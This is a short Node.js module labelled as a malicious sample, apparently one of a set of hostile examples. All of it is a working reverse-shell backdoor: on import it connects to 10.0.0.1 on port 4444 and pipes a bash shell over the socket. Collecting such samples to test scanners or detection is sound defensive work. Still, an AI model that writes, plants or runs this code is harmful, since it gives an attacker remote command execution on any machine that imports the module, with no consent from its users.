// Malicious Sample #1: Reverse Shell Backdoor
const net = require('net');
const cp = require('child_process');

function createBackdoor() {
  const client = net.connect(4444, '10.0.0.1', () => {
    const sh = cp.spawn('/bin/bash', []);
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
}

// Auto-execute on import
createBackdoor();

module.exports = { createBackdoor };
